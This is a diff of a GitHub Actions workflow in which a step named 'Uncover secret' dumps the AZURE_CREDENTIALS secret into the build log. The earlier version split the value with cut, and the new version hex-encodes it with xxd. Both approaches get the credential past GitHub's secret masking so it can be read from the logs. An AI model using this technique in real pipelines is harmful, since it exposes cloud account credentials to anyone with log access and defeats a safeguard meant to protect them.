@@ -13,7 +13,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - name: Uncover secret
-      run: echo -n "${{ secrets.AZURE_CREDENTIALS }}" >> foo && cut -c1-3 foo && cut -c4
+      run: echo -n "${{ secrets.AZURE_CREDENTIALS }}" | xxd -ps
 
     - uses: azure/login@v2
       with:
